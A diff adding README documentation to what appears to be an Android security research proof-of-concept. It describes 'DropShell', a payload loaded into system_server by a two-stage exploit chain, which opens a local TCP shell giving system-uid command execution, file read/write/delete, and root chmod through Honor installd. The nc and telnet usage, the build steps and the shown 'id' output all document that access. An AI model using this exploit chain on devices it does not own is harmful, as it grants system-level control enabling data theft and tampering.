@@ -240,3 +240,113 @@ Along with PoC app there is `utils` directory with few scripts
 # Trivia
 
 Not sure if this is related, but looking at history for possibly ABX-related bugs (`cd frameworks/base ; git log -S ABX`) I've found ["Stop processing on IOException" commit](https://android.googlesource.com/platform/frameworks/base/+/5112cfef2a2023a2629a426154547444593e9f9b%5E!/), which **includes addition of unit test with truncated ABX file**. That commit was follow-up to ["Ignore malformed shortcuts"](https://android.googlesource.com/platform/frameworks/base/+/d5122bfaf18f1503e73c1a3a177a56d0f604a008%5E%21/), which was [described in bulletin as DoS](https://source.android.com/docs/security/bulletin/2022-12-01#framework)
+
+# Improved DroppedApk
+
+This app allows to execute commands as system_server, on my Honor Magic V2 8.0.0.105:
+```
+> adb forward tcp:31337 tcp:31337
+> echo 'exec id' | adb shell 'nc 127.0.0.1 31337'
+# DropShell uid=1000 system_server
+# help | help file | help perm | help installd | help vold
+# exec [--stream|-s] <binary> [args...]  (auto-stream if -w/-f/--follow)
+# file read|write|delete|rm|stat|mkdir  |  perm chmod  |  install <apk>
+exit=0
+uid=1000(system) gid=1000(system) groups=1000(system),1001(radio),1002(bluetooth),1003(graphics),1004(input),1005(audio),1006(camera),1007(log),1008(compass),1009(mount),1010(wifi),1018(usb),1021(gps),1023(media_rw),1024(mtp),1032(package_info),1065(reserved_disk),3001(net_bt_admin),3002(net_bt),3003(inet),3005(net_admin),3006(net_bw_stats),3007(net_bw_acct),3009(readproc),3010(wakelock),3011(uhid),3012(readtracefs) context=u:r:system_server:s0
+```
+
+## DropShell changes (Aug 2026)
+
+The TCP shell on `127.0.0.1:31337` was cleaned up after confirming that **setuid `su` in `/data/local/tmp` does not work** on stock Android 14 SELinux (shell domain has no `setuid` capability; `su_exec` is neverallowed).
+
+### Removed
+
+- `su deploy` / `su install` / native `su.c` / `build_su.sh`
+- `dmesg_stream` (replaced by streaming `exec`)
+
+### File commands (`help file`)
+
+| Command | Description |
+|---------|-------------|
+| `file read <path>` | Read via Java I/O in system_server |
+| `file write <path> b64:<base64>` | Write binary |
+| `file write <path> text:<utf8>` | Write text |
+| `file stat <path>` | Metadata |
+| `file mkdir <path>` | Create directory tree |
+| `file delete <path>` / `file rm <path>` | Delete file or empty dir |
+| `file rm -r <path>` | Recursive delete |
+
+### Permissions (`help perm`)
+
+| Command | Description |
+|---------|-------------|
+| `perm chmod <path> <octal>` | Root **chmod** via installd backup restore (Honor `libhwexinstalld`) |
+
+Staging path: `/data/data/android/shortcut_clone/abx/backup_empty/`.
+After `installd copy`, files are `root:root` mode `600` — use `perm chmod` to fix mode.
+Backup info format supports **chmod only**, not arbitrary chown.
+
+Alias: `installd chmod <path> <octal>`.
+
+### installd / vold (`help installd`, `help vold`)
+
+Reorganized subcommands:
+
+- `installd copy`, `installd backup start|exec|finish|run`, `installd job`, `installd app createAppData`, `installd xattr set`, `installd link`, `installd bind`, `installd fixup`, `installd restorecon`, `installd nativelib link`, `installd rmPackageDir`
+- `vold mount`, `vold stub create|destroy`, `vold bind`, `vold read_partition`
+
+Run `installd methods` / `vold methods` for the full binder API on your device.
+
+### Streaming exec (interactive session)
+
+DropShell is a **persistent session** with `> ` prompt. Every `exec` streams stdout/stderr live.
+
+| Key | Action |
+|-----|--------|
+| Ctrl-C | Kill running `exec` |
+| Ctrl-D | Disconnect (EOF on empty line) |
+| `quit` / `exit` | Close session |
+
+```bash
+adb forward tcp:31337 tcp:31337
+telnet 127.0.0.1 31337
+> exec dmesg -w
+^C
+> exec id
+[exit 0]
+> quit
+```
+
+Legacy one-liner (session stays open after exec ends):
+
+```bash
+( printf 'exec dmesg -w\n'; cat ) | adb shell nc 127.0.0.1 31337
+```
+
+### Rebuild
+
+```bash
+./gradlew build
+adb install -r droppedapk/build/outputs/apk/release/droppedapk-release.apk
+# restart system_server (exploit chain or alarm crash) to reload code in process
+```
+
+### Build layout (two APK modules)
+
+| Module | APK | Role |
+|--------|-----|------|
+| `:app` | `app/build/outputs/apk/release/app-release-unsigned.apk` | Stage-1 exploit (install from host) |
+| `:droppedapk` | `droppedapk/build/outputs/apk/release/droppedapk-release.apk` | Payload in `system_server` (DropShell) |
+
+`./gradlew build` compiles **both** modules (debug + release) plus lint/tests. They are **not** wired as a Gradle dependency.
+
+Typical chain build:
+
+```bash
+./gradlew :droppedapk:assembleRelease
+./utils/moveapk.sh          # copies droppedapk-release.apk → app/src/main/assets/
+./gradlew :app:assembleRelease
+```
+
+After editing **only** DropShell Java, `:droppedapk:assembleRelease` + reinstall droppedapk is enough (no need to rebuild `:app`).
+
